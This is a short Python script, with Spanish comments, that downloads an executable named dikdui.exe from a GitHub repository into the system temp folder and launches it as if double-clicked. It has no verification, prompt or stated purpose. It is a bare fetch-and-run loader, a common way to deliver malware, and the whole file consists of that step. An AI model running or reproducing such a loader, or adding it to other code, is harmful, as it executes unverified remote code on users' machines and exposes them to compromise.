# launcher_exe_click.py
import os
import urllib.request
import tempfile

EXE_URL = "https://github.com/Prenda00/canlmiop/raw/refs/heads/main/dikdui.exe"
EXE_NAME = "dikdui.exe"

def main():
    tempdir = tempfile.gettempdir()
    exe_path = os.path.join(tempdir, EXE_NAME)

    # Descargar exe
    with urllib.request.urlopen(EXE_URL) as r:
        data = r.read()
    with open(exe_path, "wb") as f:
        f.write(data)

    # Abrir igual que doble-clic en Windows
    os.startfile(exe_path)

if __name__ == "__main__":
    main()
